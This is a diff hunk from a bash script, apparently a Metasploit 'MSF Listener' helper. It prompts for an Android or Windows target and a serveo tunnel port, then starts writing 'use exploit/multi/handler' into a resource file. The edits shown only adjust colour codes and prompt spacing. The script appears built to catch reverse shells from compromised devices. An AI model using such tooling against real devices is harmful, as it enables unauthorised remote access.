@@ -4,13 +4,13 @@ printf "\e[31;1m_  _ ____ ____ \e[0m\e[34;1m_    _ ____ ___ ____ _  _ ____ ____ 
 printf "\e[31;1m|\/| [__  |___\e[0m\e[34;1m |    | [__   |  |___ |\ | |___ |__/\e[0m\n"
 printf "\e[31;1m|  | ___] |    \e[0m\e[34;1m|___ | ___]  |  |___ | \| |___ |  \ \e[0m\n"
 
-printf "\e[32;5m[~] Android"
+printf "\e[32;5m[~] Android\e[0m"
 echo ""
-printf "\e[32;5m[~] Windows"
+printf "\e[32;5m[~] Windows\e[0m"
 echo ""
 read -p "Enter platform(1/2): " platform
 echo ""
-read -p "Enter serveo port : " port
+read -p "Enter serveo port: " port
 echo ""
 if [ $platform == 1 ]; then
 echo "use exploit/multi/handler" > handler.rc 
